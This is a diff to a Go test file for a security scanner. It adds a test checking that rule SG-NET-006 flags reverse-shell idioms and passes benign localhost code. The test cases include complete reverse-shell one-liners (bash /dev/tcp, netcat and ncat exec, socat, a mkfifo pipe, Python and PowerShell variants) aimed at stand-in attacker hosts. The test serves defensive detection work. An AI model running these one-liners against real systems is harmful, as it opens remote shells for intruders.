@@ -61,3 +61,51 @@ func TestInjectionOverrideCoversParaphrase(t *testing.T) {
 		}
 	}
 }
+
+// TestReverseShellIdiomsCovered checks SG-NET-006 against real-world reverse-shell
+// families beyond the classic `bash -i >& /dev/tcp/` one — and against benign
+// near-misses that must stay clean (reverse-shell idioms have no benign form, but
+// ordinary networking/localhost code does).
+func TestReverseShellIdiomsCovered(t *testing.T) {
+	packs, _ := Builtin()
+	var r *Rule
+	for _, p := range packs {
+		for _, rr := range p.Rules {
+			if rr.ID == "SG-NET-006" {
+				r = rr
+			}
+		}
+	}
+	if r == nil {
+		t.Fatal("SG-NET-006 not found")
+	}
+	cases := []struct {
+		text string
+		want bool
+	}{
+		// real-world reverse-shell families that must be caught
+		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", true},
+		{"sh -i >& /dev/tcp/10.0.0.5/9001 0>&1", true},
+		{"exec 5<>/dev/tcp/evil.example/443", true},
+		{"nc -e /bin/sh 10.0.0.1 4444", true},
+		{"ncat --exec /bin/bash attacker.tld 1337", true},
+		{"socat TCP:evil.example:443 EXEC:/bin/sh", true},
+		{"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f", true},
+		{"os.dup2(s.fileno(), 0)", true},
+		{"pty.spawn('/bin/bash')", true},
+		{"New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)", true},
+		// benign near-misses that must NOT match
+		{"app.listen(3000, '127.0.0.1')", false},
+		{"bash -c 'echo hello world'", false},
+		{"import pty  # for interactive tests", false},
+		{"socket.bind(('127.0.0.1', 8080))", false},
+		{"New-Object System.Net.WebClient", false},
+		{"run nc --version to check netcat", false},
+	}
+	for _, c := range cases {
+		got := len(r.Evaluate("body", c.text)) > 0
+		if got != c.want {
+			t.Errorf("%q: got match=%v want %v", c.text, got, c.want)
+		}
+	}
+}
